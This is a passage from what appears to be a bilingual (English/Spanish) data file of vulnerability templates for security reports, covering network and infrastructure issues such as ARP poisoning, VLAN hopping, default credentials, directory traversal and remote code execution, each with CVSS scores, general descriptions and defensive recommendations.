      impact_es: "### Impacto\nEsto podría llevar a un acceso no autorizado, divulgación de información o proporcionar una puerta trasera conveniente para un atacante.",
      recommendations_en: "### Recommendations\nRemove all debug code, backdoors, and other unused functionality from the production build of the application. Use build flags to automatically strip out this code.",
      recommendations_es: "### Recomendaciones\nEliminar todo el código de depuración, puertas traseras y otras funcionalidades no utilizadas de la compilación de producción de la aplicación. Usar indicadores de compilación para eliminar automáticamente este código.",
      references: ["https://owasp.org/www-project-mobile-top-10/2016-risks/m10-extraneous-functionality"],
      tags: ["Mobile", "Configuration"],
      ...emptyVulnBoilerplate
    },
    {
      id: "vuln-024",
      title_en: "Man-in-the-Middle (MitM)",
      title_es: "Ataque de Intermediario (MitM)",
      cwe: "CWE-295",
      severity: "High",
      cvss: { score: 8.1, vectorString: "CVSS:3.1/AV:A/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N", attackVector: "A", attackComplexity: "L", privilegesRequired: "N", userInteraction: "N", scope: "U", confidentiality: "H", integrity: "H", availability: "N" },
      overview_en: "### Overview\nAn attacker positions themselves in a conversation between a user and an application—either to eavesdrop or to impersonate one of the parties, making it appear as if a normal exchange of information is underway.",
      overview_es: "### Resumen\nUn atacante se posiciona en una conversación entre un usuario y una aplicación, ya sea para espiar o para suplantar a una de las partes, haciendo que parezca que se está produciendo un intercambio normal de información.",
      technicalDescription_en: "### Technical Description\nThis is typically achieved by intercepting network traffic on an insecure network (e.g., public Wi-Fi). If the application does not use strong encryption (e.g., TLS) or fails to validate certificates, the attacker can read and modify the traffic.",
      technicalDescription_es: "### Descripción Técnica\nEsto se logra típicamente interceptando el tráfico de red en una red insegura (p. ej., Wi-Fi público). Si la aplicación no utiliza un cifrado fuerte (p. ej., TLS) o no valida los certificados, el atacante puede leer y modificar el tráfico.",
      affectedComponents_en: "### Affected Components\n[TODO: Specify the communication channel that is vulnerable, e.g., all communication to api.example.com.]",
      affectedComponents_es: "### Componentes Afectados\n[TODO: Especificar el canal de comunicación que es vulnerable, p. ej., toda la comunicación a api.example.com.]",
      impact_en: "### Impact\nAn attacker can steal credentials, session tokens, and other sensitive data. They can also modify data in transit to perform fraudulent actions.",
      impact_es: "### Impacto\nUn atacante puede robar credenciales, tokens de sesión y otros datos sensibles. También pueden modificar los datos en tránsito para realizar acciones fraudulentas.",
      recommendations_en: "### Recommendations\nEnforce TLS for all communications. Implement certificate pinning to prevent attackers from using fraudulent certificates. Educate users about the risks of using insecure networks.",
      recommendations_es: "### Recomendaciones\nForzar TLS para todas las comunicaciones. Implementar anclaje de certificados (certificate pinning) para evitar que los atacantes usen certificados fraudulentos. Educar a los usuarios sobre los riesgos de usar redes inseguras.",
      references: ["https://owasp.org/www-community/attacks/Man-in-the-middle_attack"],
      tags: ["Network", "MitM"],
      ...emptyVulnBoilerplate
    },
    {
      id: "vuln-025",
      title_en: "DNS Spoofing",
      title_es: "Suplantación de DNS",
      cwe: "CWE-290",
      severity: "Medium",
      cvss: { score: 6.8, vectorString: "CVSS:3.1/AV:A/AC:H/PR:N/UI:R/S:U/C:H/I:H/A:N", attackVector: "A", attackComplexity: "H", privilegesRequired: "N", userInteraction: "R", scope: "U", confidentiality: "H", integrity: "H", availability: "N" },
      overview_en: "### Overview\nDNS spoofing (or DNS cache poisoning) is an attack in which altered DNS records are used to redirect online traffic to a fraudulent website that resembles its intended destination.",
      overview_es: "### Resumen\nLa suplantación de DNS (o envenenamiento de caché de DNS) es un ataque en el que se utilizan registros DNS alterados para redirigir el tráfico en línea a un sitio web fraudulento que se asemeja a su destino previsto.",
      technicalDescription_en: "### Technical Description\nAn attacker on the local network can intercept DNS queries and respond with a malicious IP address, redirecting the victim's traffic to a server controlled by the attacker.",
      technicalDescription_es: "### Descripción Técnica\nUn atacante en la red local puede interceptar las consultas DNS y responder con una dirección IP maliciosa, redirigiendo el tráfico de la víctima a un servidor controlado por el atacante.",
      affectedComponents_en: "### Affected Components\n[TODO: Specify the DNS infrastructure or client systems vulnerable to spoofing.]",
      affectedComponents_es: "### Componentes Afectados\n[TODO: Especificar la infraestructura DNS o los sistemas cliente vulnerables a la suplantación.]",
      impact_en: "### Impact\nThis can be used for phishing attacks, to trick users into providing credentials, or to serve malware.",
      impact_es: "### Impacto\nEsto se puede usar para ataques de phishing, para engañar a los usuarios para que proporcionen credenciales o para servir malware.",
      recommendations_en: "### Recommendations\nUse DNSSEC to ensure the authenticity and integrity of DNS responses. Use a trusted, secure DNS resolver. Monitor for signs of DNS spoofing.",
      recommendations_es: "### Recomendaciones\nUsar DNSSEC para garantizar la autenticidad e integridad de las respuestas DNS. Usar un resolutor DNS seguro y de confianza. Monitorear en busca de signos de suplantación de DNS.",
      references: ["https://www.cloudflare.com/learning/dns/dns-cache-poisoning/"],
      tags: ["Network", "Spoofing"],
      ...emptyVulnBoilerplate
    },
    {
      id: "vuln-026",
      title_en: "ARP Poisoning",
      title_es: "Envenenamiento ARP",
      cwe: "CWE-291",
      severity: "Medium",
      cvss: { score: 6.8, vectorString: "CVSS:3.1/AV:A/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N", attackVector: "A", attackComplexity: "H", privilegesRequired: "N", userInteraction: "N", scope: "U", confidentiality: "H", integrity: "H", availability: "N" },
      overview_en: "### Overview\nARP poisoning is a type of attack in which a malicious actor sends falsified ARP (Address Resolution Protocol) messages over a local area network. This results in the linking of an attacker's MAC address with the IP address of a legitimate computer or server on the network.",
      overview_es: "### Resumen\nEl envenenamiento de ARP es un tipo de ataque en el que un actor malicioso envía mensajes ARP (Protocolo de Resolución de Direcciones) falsificados a través de una red de área local. Esto da como resultado la vinculación de la dirección MAC de un atacante con la dirección IP de una computadora o servidor legítimo en la red.",
      technicalDescription_en: "### Technical Description\nBy sending spoofed ARP replies, an attacker can trick other devices on the LAN into sending their traffic to the attacker's machine instead of the legitimate gateway. This allows the attacker to intercept all traffic.",
      technicalDescription_es: "### Descripción Técnica\nAl enviar respuestas ARP falsificadas, un atacante puede engañar a otros dispositivos en la LAN para que envíen su tráfico a la máquina del atacante en lugar de al gateway legítimo. Esto permite al atacante interceptar todo el tráfico.",
      affectedComponents_en: "### Affected Components\n[TODO: Specify the local network segment that is vulnerable.]",
      affectedComponents_es: "### Componentes Afectados\n[TODO: Especificar el segmento de red local que es vulnerable.]",
      impact_en: "### Impact\nThis enables Man-in-the-Middle attacks, allowing the attacker to intercept, modify, or drop traffic. It can lead to session hijacking and the theft of sensitive information.",
      impact_es: "### Impacto\nEsto permite ataques de intermediario (Man-in-the-Middle), lo que permite al atacante interceptar, modificar o descartar el tráfico. Puede conducir al secuestro de sesiones y al robo de información sensible.",
      recommendations_en: "### Recommendations\nUse static ARP entries for critical systems. Implement ARP spoofing detection tools. Use switch security features like Dynamic ARP Inspection (DAI).",
      recommendations_es: "### Recomendaciones\nUsar entradas ARP estáticas para sistemas críticos. Implementar herramientas de detección de suplantación de ARP. Usar funciones de seguridad del switch como la Inspección Dinámica de ARP (DAI).",
      references: ["https://www.veracode.com/security/arp-poisoning"],
      tags: ["Network", "Spoofing"],
      ...emptyVulnBoilerplate
    },
    {
      id: "vuln-027",
      title_en: "IP Spoofing",
      title_es: "Suplantación de IP",
      cwe: "CWE-290",
      severity: "Medium",
      cvss: { score: 6.5, vectorString: "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:L/A:L", attackVector: "N", attackComplexity: "H", privilegesRequired: "N", userInteraction: "N", scope: "U", confidentiality: "L", integrity: "L", availability: "L" },
      overview_en: "### Overview\nIP spoofing is the creation of Internet Protocol (IP) packets with a forged source IP address, for the purpose of concealing the identity of the sender or impersonating another computing system.",
      overview_es: "### Resumen\nLa suplantación de IP es la creación de paquetes de Protocolo de Internet (IP) con una dirección IP de origen falsificada, con el propósito de ocultar la identidad del remitente o suplantar a otro sistema informático.",
      technicalDescription_en: "### Technical Description\nAn attacker crafts IP packets with a modified source address. This is often used in DoS attacks to hide the attacker's location, or in attacks that exploit trust relationships between systems (e.g., bypassing firewall rules based on source IP).",
      technicalDescription_es: "### Descripción Técnica\nUn atacante crea paquetes IP con una dirección de origen modificada. Esto se usa a menudo en ataques DoS para ocultar la ubicación del atacante, o en ataques que explotan las relaciones de confianza entre sistemas (p. ej., eludir reglas de firewall basadas en la IP de origen).",
      affectedComponents_en: "### Affected Components\n[TODO: Specify systems or network segments that are vulnerable to IP spoofing attacks.]",
      affectedComponents_es: "### Componentes Afectados\n[TODO: Especificar sistemas o segmentos de red que son vulnerables a ataques de suplantación de IP.]",
      impact_en: "### Impact\nIP spoofing can be used to bypass authentication mechanisms, launch DoS attacks, and hide the attacker's identity.",
      impact_es: "### Impacto\nLa suplantación de IP se puede usar para eludir mecanismos de autenticación, lanzar ataques DoS y ocultar la identidad del atacante.",
      recommendations_en: "### Recommendations\nImplement ingress and egress filtering on routers and firewalls to block packets with forged source addresses. Use cryptographic authentication to verify the identity of hosts.",
      recommendations_es: "### Recomendaciones\nImplementar filtrado de entrada y salida en enrutadores y cortafuegos para bloquear paquetes con direcciones de origen falsificadas. Usar autenticación criptográfica para verificar la identidad de los hosts.",
      references: ["https://www.imperva.com/learn/ddos/ip-spoofing/"],
      tags: ["Network", "Spoofing"],
      ...emptyVulnBoilerplate
    },
    {
      id: "vuln-028",
      title_en: "Denial of Service (DoS)",
      title_es: "Denegación de Servicio (DoS)",
      cwe: "CWE-400",
      severity: "High",
      cvss: { score: 7.5, vectorString: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H", attackVector: "N", attackComplexity: "L", privilegesRequired: "N", userInteraction: "N", scope: "U", confidentiality: "N", integrity: "N", availability: "H" },
      overview_en: "### Overview\nA DoS attack is a cyber-attack in which the perpetrator seeks to make a machine or network resource unavailable to its intended users by temporarily or indefinitely disrupting services of a host connected to the Internet.",
      overview_es: "### Resumen\nUn ataque DoS es un ciberataque en el que el autor busca hacer que una máquina o recurso de red no esté disponible para sus usuarios previstos interrumpiendo temporal o indefinidamente los servicios de un host conectado a Internet.",
      technicalDescription_en: "### Technical Description\nDoS attacks can be performed in many ways, such as flooding a network with traffic (e.g., SYN flood), exploiting a software vulnerability that causes a crash, or exhausting system resources like CPU or memory.",
      technicalDescription_es: "### Descripción Técnica\nLos ataques DoS se pueden realizar de muchas maneras, como inundar una red con tráfico (p. ej., inundación SYN), explotar una vulnerabilidad de software que causa un bloqueo o agotar los recursos del sistema como la CPU o la memoria.",
      affectedComponents_en: "### Affected Components\n[TODO: Specify the service or system that is vulnerable to a DoS attack.]",
      affectedComponents_es: "### Componentes Afectados\n[TODO: Especificar el servicio o sistema que es vulnerable a un ataque DoS.]",
      impact_en: "### Impact\nA successful DoS attack can render a service completely unavailable, leading to financial losses and reputational damage.",
      impact_es: "### Impacto\nUn ataque DoS exitoso puede hacer que un servicio no esté disponible por completo, lo que conduce a pérdidas financieras y daños a la reputación.",
      recommendations_en: "### Recommendations\nImplement rate limiting and traffic shaping. Use a DoS mitigation service. Configure firewalls and routers to block malicious traffic patterns. Regularly apply security patches.",
      recommendations_es: "### Recomendaciones\nImplementar limitación de velocidad y modelado de tráfico. Usar un servicio de mitigación de DoS. Configurar cortafuegos y enrutadores para bloquear patrones de tráfico maliciosos. Aplicar parches de seguridad regularmente.",
      references: ["https://www.cloudflare.com/learning/ddos/denial-of-service-attack/"],
      tags: ["Network", "DoS"],
      ...emptyVulnBoilerplate
    },
    {
      id: "vuln-029",
      title_en: "VLAN Hopping",
      title_es: "Salto de VLAN",
      cwe: "CWE-265",
      severity: "Medium",
      cvss: { score: 5.8, vectorString: "CVSS:3.1/AV:A/AC:H/PR:N/UI:N/S:U/C:L/I:L/A:L", attackVector: "A", attackComplexity: "H", privilegesRequired: "N", userInteraction: "N", scope: "U", confidentiality: "L", integrity: "L", availability: "L" },
      overview_en: "### Overview\nVLAN hopping is an attack method that allows an attacker on one VLAN to gain access to traffic on other VLANs that would normally not be accessible.",
      overview_es: "### Resumen\nEl salto de VLAN es un método de ataque que permite a un atacante en una VLAN obtener acceso al tráfico en otras VLAN que normalmente no serían accesibles.",
      technicalDescription_en: "### Technical Description\nThere are two main types of VLAN hopping attacks: switch spoofing and double tagging. In switch spoofing, the attacker's machine emulates a switch and uses a trunking protocol (like DTP) to gain access to all VLANs. In double tagging, the attacker crafts a packet with two 802.1Q headers to trick the switch into forwarding the packet to a different VLAN.",
      technicalDescription_es: "### Descripción Técnica\nHay dos tipos principales de ataques de salto de VLAN: suplantación de switch y doble etiquetado. En la suplantación de switch, la máquina del atacante emula un switch y utiliza un protocolo de troncal (como DTP) para obtener acceso a todas las VLAN. En el doble etiquetado, el atacante crea un paquete con dos cabeceras 802.1Q para engañar al switch y que reenvíe el paquete a una VLAN diferente.",
      affectedComponents_en: "### Affected Components\n[TODO: Specify the network switches and ports that are misconfigured.]",
      affectedComponents_es: "### Componentes Afectados\n[TODO: Especificar los switches de red y los puertos que están mal configurados.]",
      impact_en: "### Impact\nAn attacker can bypass network segmentation controls, allowing them to access sensitive systems and intercept traffic from other VLANs.",
      impact_es: "### Impacto\nUn atacante puede eludir los controles de segmentación de red, lo que le permite acceder a sistemas sensibles e interceptar tráfico de otras VLAN.",
      recommendations_en: "### Recommendations\nDisable Dynamic Trunking Protocol (DTP) on user-facing ports. Set ports to access mode explicitly. Configure the native VLAN to an unused VLAN ID. Use private VLANs where appropriate.",
      recommendations_es: "### Recomendaciones\nDeshabilitar el Protocolo de Enlace Troncal Dinámico (DTP) en los puertos de cara al usuario. Establecer los puertos en modo de acceso explícitamente. Configurar la VLAN nativa a un ID de VLAN no utilizado. Usar VLAN privadas cuando sea apropiado.",
      references: ["https://www.cisco.com/c/en/us/td/docs/switches/lan/catalyst_2950/software/release/12-1_9_ea1/configuration/guide/scg/swvlan.html#wp1139414"],
      tags: ["Network", "VLAN"],
      ...emptyVulnBoilerplate
    },
    {
      id: "vuln-030",
      title_en: "Weak Network Encryption",
      title_es: "Cifrado Débil de Red",
      cwe: "CWE-326",
      severity: "High",
      cvss: { score: 7.5, vectorString: "CVSS:3.1/AV:A/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N", attackVector: "A", attackComplexity: "L", privilegesRequired: "N", userInteraction: "N", scope: "U", confidentiality: "H", integrity: "N", availability: "N" },
      overview_en: "### Overview\nThe network uses weak or outdated encryption protocols (e.g., WEP for Wi-Fi, older versions of SSL/TLS) that can be easily broken by an attacker.",
      overview_es: "### Resumen\nLa red utiliza protocolos de cifrado débiles u obsoletos (p. ej., WEP para Wi-Fi, versiones antiguas de SSL/TLS) que un atacante puede romper fácilmente.",
      technicalDescription_en: "### Technical Description\nAn attacker on the network can capture encrypted traffic and use known attacks against the weak protocol to decrypt it and recover the plaintext data.",
      technicalDescription_es: "### Descripción Técnica\nUn atacante en la red puede capturar el tráfico cifrado y usar ataques conocidos contra el protocolo débil para descifrarlo y recuperar los datos en texto plano.",
      affectedComponents_en: "### Affected Components\n[TODO: Specify the service or device using weak encryption, e.g., Wi-Fi access point using WEP, web server using SSLv3.]",
      affectedComponents_es: "### Componentes Afectados\n[TODO: Especificar el servicio o dispositivo que utiliza cifrado débil, p. ej., punto de acceso Wi-Fi usando WEP, servidor web usando SSLv3.]",
      impact_en: "### Impact\nThis allows an attacker to eavesdrop on all network communications, stealing sensitive data like credentials and session tokens.",
      impact_es: "### Impacto\nEsto permite a un atacante espiar todas las comunicaciones de la red, robando datos sensibles como credenciales y tokens de sesión.",
      recommendations_en: "### Recommendations\nUse strong, modern encryption protocols (e.g., WPA3 for Wi-Fi, TLS 1.2/1.3 for web traffic). Disable support for outdated and insecure protocols and cipher suites.",
      recommendations_es: "### Recomendaciones\nUsar protocolos de cifrado fuertes y modernos (p. ej., WPA3 para Wi-Fi, TLS 1.2/1.3 para el tráfico web). Deshabilitar el soporte para protocolos y conjuntos de cifrado obsoletos e inseguros.",
      references: ["https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-52r2.pdf"],
      tags: ["Network", "Cryptography"],
      ...emptyVulnBoilerplate
    },
    {
      id: "vuln-031",
      title_en: "Firewall Misconfiguration",
      title_es: "Configuración Incorrecta de Cortafuegos",
      cwe: "CWE-16",
      severity: "Medium",
      cvss: { score: 6.5, vectorString: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N", attackVector: "N", attackComplexity: "L", privilegesRequired: "N", userInteraction: "N", scope: "U", confidentiality: "L", integrity: "L", availability: "N" },
      overview_en: "### Overview\nFirewall rules are overly permissive, poorly ordered, or otherwise misconfigured, allowing unintended traffic to pass through and exposing internal systems to attack.",
      overview_es: "### Resumen\nLas reglas del cortafuegos son demasiado permisivas, están mal ordenadas o configuradas incorrectamente de alguna otra manera, lo que permite que el tráfico no deseado pase y expone los sistemas internos a ataques.",
      technicalDescription_en: "### Technical Description\nThe firewall ruleset may contain an 'allow any' rule that is too broad, rules that are in the wrong order (e.g., a specific deny rule placed after a general allow rule), or ports that are unnecessarily open to the internet.",
      technicalDescription_es: "### Descripción Técnica\nEl conjunto de reglas del cortafuegos puede contener una regla 'permitir todo' que es demasiado amplia, reglas que están en el orden incorrecto (p. ej., una regla de denegación específica colocada después de una regla de permiso general), o puertos que están innecesariamente abiertos a Internet.",
      affectedComponents_en: "### Affected Components\n[TODO: Specify the firewall and the specific misconfigured rule(s).]",
      affectedComponents_es: "### Componentes Afectados\n[TODO: Especificar el cortafuegos y la(s) regla(s) específica(s) mal configurada(s).]",
      impact_en: "### Impact\nThis can expose vulnerable services on the internal network to external attackers, bypassing a key perimeter defense.",
      impact_es: "### Impacto\nEsto puede exponer servicios vulnerables en la red interna a atacantes externos, eludiendo una defensa perimetral clave.",
      recommendations_en: "### Recommendations\nFollow the principle of least privilege: deny all traffic by default and only allow what is explicitly required. Regularly audit firewall rules. Remove any unnecessary or overly permissive rules.",
      recommendations_es: "### Recomendaciones\nSeguir el principio de privilegio mínimo: denegar todo el tráfico por defecto y solo permitir lo que se requiere explícitamente. Auditar regularmente las reglas del cortafuegos. Eliminar cualquier regla innecesaria o demasiado permisiva.",
      references: ["https://www.sans.org/posters/firewall-packet-filtering/"],
      tags: ["Network", "Configuration"],
      ...emptyVulnBoilerplate
    },
    {
      id: "vuln-032",
      title_en: "Unsecured Wi-Fi",
      title_es: "Wi-Fi no Segura",
      cwe: "CWE-311",
      severity: "Medium",
      cvss: { score: 6.5, vectorString: "CVSS:3.1/AV:A/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:L", attackVector: "A", attackComplexity: "L", privilegesRequired: "N", userInteraction: "N", scope: "U", confidentiality: "L", integrity: "L", availability: "L" },
      overview_en: "### Overview\nA Wi-Fi network that is either open (no password) or uses weak encryption (WEP, WPA) and can be easily accessed by unauthorized users.",
      overview_es: "### Resumen\nUna red Wi-Fi que está abierta (sin contraseña) o utiliza un cifrado débil (WEP, WPA) y puede ser accedida fácilmente por usuarios no autorizados.",
      technicalDescription_en: "### Technical Description\nThe wireless access point is not configured with strong security settings. An attacker within range can connect to the network, granting them access to internal resources and the ability to eavesdrop on traffic.",
      technicalDescription_es: "### Descripción Técnica\nEl punto de acceso inalámbrico no está configurado con ajustes de seguridad sólidos. Un atacante dentro del alcance puede conectarse a la red, lo que le otorga acceso a recursos internos y la capacidad de espiar el tráfico.",
      affectedComponents_en: "### Affected Components\n[TODO: Specify the SSID of the insecure Wi-Fi network.]",
      affectedComponents_es: "### Componentes Afectados\n[TODO: Especificar el SSID de la red Wi-Fi insegura.]",
      impact_en: "### Impact\nUnauthorized access to the internal network can lead to further attacks, data theft, and compromise of internal systems.",
      impact_es: "### Impacto\nEl acceso no autorizado a la red interna puede conducir a más ataques, robo de datos y compromiso de los sistemas internos.",
      recommendations_en: "### Recommendations\nSecure all Wi-Fi networks with WPA3 encryption and a strong, complex password. Segment guest networks from internal corporate networks. Hide the SSID if possible.",
      recommendations_es: "### Recomendaciones\nAsegurar todas las redes Wi-Fi con cifrado WPA3 y una contraseña fuerte y compleja. Segmentar las redes de invitados de las redes corporativas internas. Ocultar el SSID si es posible.",
      references: ["https://www.fcc.gov/consumers/guides/securing-your-wireless-network"],
      tags: ["Network", "Wi-Fi"],
      ...emptyVulnBoilerplate
    },
    {
      id: "vuln-033",
      title_en: "Packet Sniffing",
      title_es: "Análisis de Paquetes",
      cwe: "CWE-311",
      severity: "Medium",
      cvss: { score: 5.3, vectorString: "CVSS:3.1/AV:A/AC:H/PR:N/UI:N/S:U/C:L/I:L/A:N", attackVector: "A", attackComplexity: "H", privilegesRequired: "N", userInteraction: "N", scope: "U", confidentiality: "L", integrity: "L", availability: "N" },
      overview_en: "### Overview\nPacket sniffing is the act of capturing and inspecting data packets as they travel across a network. An attacker can use this technique to intercept unencrypted data, including credentials and sensitive information.",
      overview_es: "### Resumen\nEl análisis de paquetes es el acto de capturar e inspeccionar paquetes de datos mientras viajan a través de una red. Un atacante puede usar esta técnica para interceptar datos no cifrados, incluidas credenciales e información sensible.",
      technicalDescription_en: "### Technical Description\nUsing tools like Wireshark or tcpdump, an attacker on the same local network can capture all traffic. If any applications transmit data in cleartext (e.g., over HTTP, FTP, Telnet), the attacker can read it directly.",
      technicalDescription_es: "### Descripción Técnica\nUsando herramientas como Wireshark o tcpdump, un atacante en la misma red local puede capturar todo el tráfico. Si alguna aplicación transmite datos en texto plano (p. ej., a través de HTTP, FTP, Telnet), el atacante puede leerlos directamente.",
      affectedComponents_en: "### Affected Components\n[TODO: Specify the protocol or application transmitting data in cleartext.]",
      affectedComponents_es: "### Componentes Afectados\n[TODO: Especificar el protocolo o la aplicación que transmite datos en texto plano.]",
      impact_en: "### Impact\nThis can lead to the exposure of sensitive data, credentials, and session tokens, enabling further attacks.",
      impact_es: "### Impacto\nEsto puede llevar a la exposición de datos sensibles, credenciales y tokens de sesión, lo que permite más ataques.",
      recommendations_en: "### Recommendations\nEncrypt all network traffic using strong protocols like TLS 1.2/1.3 and SSH. Avoid using insecure legacy protocols like Telnet and FTP.",
      recommendations_es: "### Recomendaciones\nCifrar todo el tráfico de red utilizando protocolos sólidos como TLS 1.2/1.3 y SSH. Evitar el uso de protocolos heredados inseguros como Telnet y FTP.",
      references: ["https://www.wireshark.org/"],
      tags: ["Network", "Eavesdropping"],
      ...emptyVulnBoilerplate
    },
    {
      id: "vuln-034",
      title_en: "Unpatched Software",
      title_es: "Software sin Parches",
      cwe: "CWE-937",
      severity: "Critical",
      cvss: { score: 9.8, vectorString: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H", attackVector: "N", attackComplexity: "L", privilegesRequired: "N", userInteraction: "N", scope: "U", confidentiality: "H", integrity: "H", availability: "H" },
      overview_en: "### Overview\nThe system is running outdated software with publicly known vulnerabilities. Attackers can exploit these vulnerabilities to compromise the system.",
      overview_es: "### Resumen\nEl sistema está ejecutando software obsoleto con vulnerabilidades conocidas públicamente. Los atacantes pueden explotar estas vulnerabilidades para comprometer el sistema.",
      technicalDescription_en: "### Technical Description\nA service or application (e.g., Apache, WordPress, OpenSSH) is running a version that is known to be vulnerable to a specific CVE. Public exploits are often available for these vulnerabilities, making them easy to exploit.",
      technicalDescription_es: "### Descripción Técnica\nUn servicio o aplicación (p. ej., Apache, WordPress, OpenSSH) está ejecutando una versión que se sabe que es vulnerable a un CVE específico. A menudo hay exploits públicos disponibles para estas vulnerabilidades, lo que las hace fáciles de explotar.",
      affectedComponents_en: "### Affected Components\n[TODO: Specify the unpatched software, its version, and the relevant CVE(s).]",
      affectedComponents_es: "### Componentes Afectados\n[TODO: Especificar el software sin parches, su versión y el/los CVE(s) relevante(s).]",
      impact_en: "### Impact\nExploitation can lead to remote code execution, denial of service, or full system compromise.",
      impact_es: "### Impacto\nLa explotación puede conducir a la ejecución remota de código, la denegación de servicio o el compromiso total del sistema.",
      recommendations_en: "### Recommendations\nImplement a robust patch management process. Regularly scan for and apply security patches to all software. Prioritize patching for critical, internet-facing systems.",
      recommendations_es: "### Recomendaciones\nImplementar un proceso sólido de gestión de parches. Escanear y aplicar regularmente parches de seguridad a todo el software. Priorizar la aplicación de parches para sistemas críticos de cara a Internet.",
      references: ["https://www.cisa.gov/known-exploited-vulnerabilities-catalog"],
      tags: ["Infrastructure", "Patch Management"],
      ...emptyVulnBoilerplate
    },
    {
      id: "vuln-035",
      title_en: "Default Credentials",
      title_es: "Credenciales por Defecto",
      cwe: "CWE-1393",
      severity: "High",
      cvss: { score: 8.8, vectorString: "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H", attackVector: "N", attackComplexity: "L", privilegesRequired: "L", userInteraction: "N", scope: "U", confidentiality: "H", integrity: "H", availability: "H" },
      overview_en: "### Overview\nA system or application is using default, well-known credentials (e.g., admin/admin) that have not been changed.",
      overview_es: "### Resumen\nUn sistema o aplicación está utilizando credenciales predeterminadas y bien conocidas (p. ej., admin/admin) que no se han cambiado.",
      technicalDescription_en: "### Technical Description\nAn attacker can easily guess or look up the default credentials for a piece of hardware or software and use them to gain administrative access.",
      technicalDescription_es: "### Descripción Técnica\nUn atacante puede adivinar o buscar fácilmente las credenciales predeterminadas para una pieza de hardware o software y usarlas para obtener acceso administrativo.",
      affectedComponents_en: "### Affected Components\n[TODO: Specify the system or application using default credentials, e.g., router admin panel, database service.]",
      affectedComponents_es: "### Componentes Afectados\n[TODO: Especificar el sistema o la aplicación que utiliza credenciales predeterminadas, p. ej., panel de administración del enrutador, servicio de base de datos.]",
      impact_en: "### Impact\nThis provides an attacker with an easy path to gaining privileged access to a system, potentially leading to a full compromise of the network.",
      impact_es: "### Impacto\nEsto proporciona a un atacante un camino fácil para obtener acceso privilegiado a un sistema, lo que podría llevar a un compromiso total de la red.",
      recommendations_en: "### Recommendations\nChange all default passwords immediately upon deploying a new system or application. Implement a policy to ensure that all default credentials are changed.",
      recommendations_es: "### Recomendaciones\nCambiar todas las contraseñas predeterminadas inmediatamente después de implementar un nuevo sistema o aplicación. Implementar una política para garantizar que todas las credenciales predeterminadas se cambien.",
      references: ["https://cwe.mitre.org/data/definitions/1393.html"],
      tags: ["Infrastructure", "Authentication"],
      ...emptyVulnBoilerplate
    },
    {
      id: "vuln-036",
      title_en: "Directory Traversal",
      title_es: "Salto de Directorio",
      cwe: "CWE-22",
      severity: "High",
      cvss: { score: 7.5, vectorString: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N", attackVector: "N", attackComplexity: "L", privilegesRequired: "N", userInteraction: "N", scope: "U", confidentiality: "H", integrity: "N", availability: "N" },
      overview_en: "### Overview\nDirectory traversal (also known as path traversal) is a web security vulnerability that allows an attacker to read arbitrary files on the server that is running an application.",
      overview_es: "### Resumen\nEl salto de directorio (también conocido como salto de ruta) es una vulnerabilidad de seguridad web que permite a un atacante leer archivos arbitrarios en el servidor que está ejecutando una aplicación.",
      technicalDescription_en: "### Technical Description\nThe application uses user-supplied input to construct a path to a file. An attacker can use path traversal sequences like `../` to navigate up the directory tree and access files outside of the intended directory.",
      technicalDescription_es: "### Descripción Técnica\nLa aplicación utiliza la entrada proporcionada por el usuario para construir una ruta a un archivo. Un atacante puede usar secuencias de salto de directorio como `../` para navegar hacia arriba en el árbol de directorios y acceder a archivos fuera del directorio previsto.",
      affectedComponents_en: "### Affected Components\n[TODO: Specify the vulnerable parameter and functionality, e.g., the `filename` parameter in a file download feature.]",
      affectedComponents_es: "### Componentes Afectados\n[TODO: Especificar el parámetro y la funcionalidad vulnerables, p. ej., el parámetro `filename` en una función de descarga de archivos.]",
      impact_en: "### Impact\nThis can lead to the disclosure of sensitive information, such as source code, credentials, and system configuration files.",
      impact_es: "### Impacto\nEsto puede conducir a la divulgación de información sensible, como el código fuente, las credenciales y los archivos de configuración del sistema.",
      recommendations_en: "### Recommendations\nValidate user input before using it in filesystem operations. Use a whitelist of allowed file paths. Run the application in a sandboxed environment to restrict filesystem access.",
      recommendations_es: "### Recomendaciones\nValidar la entrada del usuario antes de usarla en operaciones del sistema de archivos. Usar una lista blanca de rutas de archivo permitidas. Ejecutar la aplicación en un entorno aislado (sandbox) para restringir el acceso al sistema de archivos.",
      references: ["https://owasp.org/www-community/attacks/Path_Traversal"],
      tags: ["Infrastructure", "File Inclusion"],
      ...emptyVulnBoilerplate
    },
    {
      id: "vuln-037",
      title_en: "Remote Code Execution (RCE)",
      title_es: "Ejecución Remota de Código (RCE)",
      cwe: "CWE-94",
      severity: "Critical",
      cvss: { score: 9.8, vectorString: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H", attackVector: "N", attackComplexity: "L", privilegesRequired: "N", userInteraction: "N", scope: "U", confidentiality: "H", integrity: "H", availability: "H" },
      overview_en: "### Overview\nRCE is a class of software vulnerability that allows a malicious actor to execute arbitrary commands or code on a target machine or in a target process. RCE vulnerabilities are among the most dangerous.",
      overview_es: "### Resumen\nRCE es una clase de vulnerabilidad de software que permite a un actor malicioso ejecutar comandos o código arbitrario en una máquina o proceso objetivo. Las vulnerabilidades RCE se encuentran entre las más peligrosas.",
      technicalDescription_en: "### Technical Description\nRCE can result from various other vulnerabilities, such as insecure deserialization, command injection, or exploiting an unpatched library. The attacker finds a way to inject and execute their own code on the server.",
      technicalDescription_es: "### Descripción Técnica\nRCE puede ser el resultado de varias otras vulnerabilidades, como la deserialización insegura, la inyección de comandos o la explotación de una biblioteca sin parches. El atacante encuentra una manera de inyectar y ejecutar su propio código en el servidor.",
      affectedComponents_en: "### Affected Components\n[TODO: Specify the vulnerable component and the vector used to achieve RCE.]",
      affectedComponents_es: "### Componentes Afectados\n[TODO: Especificar el componente vulnerable y el vector utilizado para lograr RCE.]",
